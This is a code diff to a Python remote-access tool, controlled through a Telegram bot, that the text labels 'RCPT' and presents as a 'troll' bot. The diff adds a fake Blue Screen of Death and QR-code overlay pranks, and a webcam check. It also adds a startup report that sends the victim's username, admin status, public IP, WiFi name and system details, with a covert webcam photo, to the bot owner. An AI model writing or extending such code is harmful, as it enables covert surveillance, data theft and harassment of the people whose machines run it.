@@ -150,8 +150,19 @@ if isfile(prototxt_filename) and isfile(caffemodel_filename):
 else:
     FACERECOGNITION = False
 
+def check_webcam():
+    try:
+        cap = VideoCapture(0)
+        if cap.isOpened():
+            ret, _ = cap.read()
+            cap.release()
+            return "Detected ✅" + (" (Face recog ready)" if FACERECOGNITION else "")
+        return "Not detected ❌"
+    except:
+        return "Error checking camera"
+
 def now() -> str:
-    return datetime.now().strfmonotonic("%Y-%m-%d %H:%M:%S")
+    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
 #GETTING TOKEN AND CHAT_ID
 def getCred(filename:str=resource_path("auth.json")) -> tuple[str,int]:
@@ -479,7 +490,9 @@ class PeppinoTelegram:
             # 😈 Pranks & Visuals
             Command("jumpscare", self.jumpscare, "Trigger random jumpscare.", "😈 Pranks", "👻 Jumpscare"),
             Command("jumpscarenoaudio", self.jumpscarenoaudio, "Jumpscare without sound.", "😈 Pranks", "😶‍🌫️ Jumpscare noaudio"),
+            Command("fakebsod", self.fake_bsod, "Show fake Blue Screen of Death.", "😈 Pranks", "💀 Fake BSOD"),
             Command("invertedscreen", self.inverted_screen, "Invert screen colors.", "😈 Pranks", "🔄 Inverted Screen"),
+            Command("showqr",self.show_qr_overlay,"Display QR code overlay with custom text. Args: url [text] [duration]","😈 Pranks","QR Overlay"),
             Command("distortedscreen", self.distorted_screen, "Distort screen output.", "😈 Pranks", "🌀 Distorted Screen"),
             Command("messagebox", self.message_box, "Show custom message box.", "😈 Pranks", "💬 Message Box"),
             Command("messagespam", self.spam_windows, "Spam message boxes.", "😈 Pranks", "📨 Message Spam"),
@@ -656,6 +669,9 @@ class PeppinoTelegram:
         print(f"Sending MarkdownV2 message: {text[:50]}...")
         self.bsend(text, retries, parse_mode="MarkDownV2", reply_markup=reply_markup)
 
+    def bsendWithHtml(self, text: str, retries=0, reply_markup=None) -> int|None:
+        print(f"Sending HTML message: {text[:50]}...")
+        self.bsend(text, retries, parse_mode="HTML", reply_markup=reply_markup)
 
     def download_file(self, path: str) -> None:
         print(f"Downloading file: {path}")
@@ -1820,6 +1836,10 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             self.__send_image(x, caption=monitor_name)
         #return [x for x in fast_screenshot(join(BURN_DIRECTORY, "tmp{mon}tmp.png"), lambda x:self.__send_image(x, caption=caption))]
 
+    def fake_bsod(self, duration: int = 15, qr_url: str = None):
+        self.overlay_tk.fake_bsod(duration=float(duration), qr_code_url=qr_url)
+        self.bsend(f"Fake BSOD activated for {duration} seconds (Comic Sans + dual progress bars)")
+
     def replyquickmenu(self) -> int:
         print("Creating reply quick menu")
         commands = [f"/{c.name}" for c in self.commands]
@@ -2103,7 +2123,8 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
                     self.owner_id,
                     f,
                     caption=caption,
-                    reply_markup=reply_markup
+                    reply_markup=reply_markup,
+                    parse_mode="Markdownv2"
                 )
                 self.all_session_messages.append(resp["message_id"])
 
@@ -2245,6 +2266,14 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             remove(image_path)
         except Exception as e:
             self.bsend(f"Error while trying to show image: \n{e}")
+
+    def show_qr_overlay(self, url: str, text: str = "Scan me", duration: int = None):
+        self.overlay_tk.qr_overlay(
+            url=url,
+            custom_text=text,
+            duration=float(duration) if duration else None
+        )
+        self.bsend(f"QR overlay shown: {url}")
 
     def shutdown(self, seconds=0) -> None:
         print(f"Shutting down in {seconds} seconds")
@@ -2432,17 +2461,29 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
 
         self.screen_width, self.screen_height = pg.size()
         STARTING_LOG_MESSAGE.edit("GOT SCREEN SIZE")
+
+        public_ip = get_public_ip()
+
         botstartedmessage = (
-            "🚀 *RCPT Online*\n"
-            f"👤 User: `{getlogin()}`\n"
-            f"🛡️ Admin: `{'YES' if self.has_admin else 'NO'}`"
+            "🚀 *RCPT Online \\- Ready to Troll* 🚀\n\n"
+            f"🕒 *Started*: `{now()}`\n"
+            f"👤 *User*: `{getlogin()}`\n"
+            f"🛡️ *Admin*: `{'YES ✅' if self.has_admin else 'NO ❌'}`\n"
+            f"🌐 *Public IP*: `{public_ip}`\n"
+            f"📡 *WiFi*: `{get_wifi_name()}`\n"
+            f"📸 *Webcam*: `{check_webcam()}`\n"
+            f"💻 *OS*: `{platform.system()} {platform.release()} ({platform.machine()})`\n"
+            f"🔋 *CPU Load*: `{psutil.cpu_percent():.1f}%` \\| *RAM*: `{psutil.virtual_memory().percent:.1f}%`\n\n"
+            "🔥 Bot is live and waiting for commands\\! Use /help or /menu\\."
         )
 
-        if not sys.argv[1:]:
-            if not self.selfie(botstartedmessage, reply_markup=self.replyquickmenu()):
-                self.bsendWithMarkdownV2(botstartedmessage, reply_markup=self.replyquickmenu())
-        else:
-            self.bsendWithMarkdownV2(botstartedmessage, reply_markup=self.replyquickmenu())
+        try:
+            self.selfie(
+                caption=botstartedmessage,
+                reply_markup=self.replyquickmenu()
+            )
+        except Exception as e:
+            print(f"Startup selfie failed: {e}")
 
         #cleanup update
         self.bot.getUpdates(-1) #if the bot gets accidentally added to a group, which telepot can't handle, this will fix it
